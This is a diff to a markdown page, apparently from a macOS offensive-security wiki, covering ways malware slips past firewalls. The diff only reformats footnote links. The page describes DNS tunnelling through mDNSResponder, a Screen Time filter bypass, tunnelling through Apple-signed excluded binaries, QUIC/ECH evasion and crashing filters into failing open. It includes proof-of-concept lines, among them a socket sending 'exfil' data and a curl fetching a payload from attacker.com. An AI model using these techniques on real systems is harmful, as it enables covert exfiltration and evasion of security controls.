@@ -36,9 +36,9 @@ lsof -i TCP -sTCP:ESTABLISHED
 
 ### Abusing DNS
 
-On macOS a process does **not** talk to the DNS server itself. Name resolution is brokered over **XPC** by **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), an Apple-signed system daemon, so every lookup on the machine leaves the host as traffic **from `mDNSResponder`** instead of from the process that wanted it. Firewalls therefore tend to trust that daemon unconditionally — denying it would break name resolution for the whole system.<sup>[1]</sup>
+On macOS a process does **not** talk to the DNS server itself. Name resolution is brokered over **XPC** by **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), an Apple-signed system daemon, so every lookup on the machine leaves the host as traffic **from `mDNSResponder`** instead of from the process that wanted it. Firewalls therefore tend to trust that daemon unconditionally — denying it would break name resolution for the whole system.<sup>[[1]](#references)</sup>
 
-That makes DNS a channel that stays open even when the firewall blocks the malware's own sockets:<sup>[1]</sup>
+That makes DNS a channel that stays open even when the firewall blocks the malware's own sockets:<sup>[[1]](#references)</sup>
 
 1. The malware tries to connect to `evil.com`. Its **own** outbound connection is examined by the firewall and **blocked**.
 2. The malware instead asks `mDNSResponder` to **resolve** `evil.com`, over XPC.
@@ -100,7 +100,7 @@ macos-proces-abuse/
 
 ### Web content filter (Screen Time) bypass – **CVE-2024-44206**
 In July 2024 Apple patched a critical bug in Safari/WebKit that broke the system-wide “Web content filter” used by Screen Time parental controls.
-A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.<sup>[2]</sup>
+A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.<sup>[[2]](#references)</sup>
 
 Practical test (un-patched system):
 
@@ -122,7 +122,7 @@ sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 
 ### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
 Before macOS 11.2 the **`ContentFilterExclusionList`** allowed ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.).
-Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.<sup>[3]</sup>
+Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.<sup>[[3]](#references)</sup>
 
 Example proof-of-concept (pre-11.2):
 
@@ -136,7 +136,7 @@ s.send(b"exfil...")
 ```
 
 ### QUIC/ECH to evade Network Extension domain filters (macOS 12+)
-NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.<sup>[5]</sup>
+NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.<sup>[[5]](#references)</sup>
 
 Minimal PoC:
 
@@ -154,7 +154,7 @@ curl --http3-only https://attacker.com/payload
 If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.
 
 ### macOS 15 “Sequoia” Network Extension instability (2024–2025)
-Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.<sup>[4]</sup>
+Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.<sup>[[4]](#references)</sup>
 
 Quick reproduction (safe lab box):
 
